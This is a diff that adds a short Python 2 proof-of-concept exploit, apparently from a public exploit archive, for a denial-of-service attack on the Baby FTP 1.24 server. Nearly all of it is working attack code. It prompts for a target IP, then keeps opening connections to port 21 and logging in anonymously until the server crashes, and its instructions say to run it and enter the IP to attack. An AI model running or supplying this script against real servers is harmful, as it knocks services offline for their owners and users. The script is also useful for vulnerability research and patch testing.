@@ -1,0 +1,48 @@
+#!/usr/bin/python
+
+### Baby FTP 1.24 - Denial of Service by n30m1nd ### 
+
+# Date: 2016-10-27
+# PoC Author: n30m1nd
+# Vendor Homepage: http://www.pablosoftwaresolutions.com/
+# Software Link: http://www.pablosoftwaresolutions.com/download.php?id=1
+# Version: 1.24
+# Tested on: Win7 64bit and Win10 64 bit
+
+# Credits
+# =======
+# Shouts to the crew at Offensive Security for their huge efforts on making	the infosec community better
+
+# How to
+# ======
+# * Run this python script and write the IP to attack.
+
+# Why?
+# ====
+# The FTP Server can't handle more than ~1505 connections at the same time
+
+# Exploit code
+# ============
+
+import socket
+
+ip = raw_input("[+] IP to attack: ")
+
+sarr = []
+i = 0
+while True:
+	try:
+		sarr.append(socket.create_connection((ip,21)))
+		print "[+] Connection %d" % i
+		crash1 = "A"*500
+
+		sarr[i].send("USER anonymous\r\n" )
+		sarr[i].recv(4096)
+
+		sarr[i].send("PASS n30m1nd\r\n" )
+		sarr[i].recv(4096)
+		i+=1
+	except socket.error:
+		print "[*] Server crashed!!"
+        raw_input()
+		break
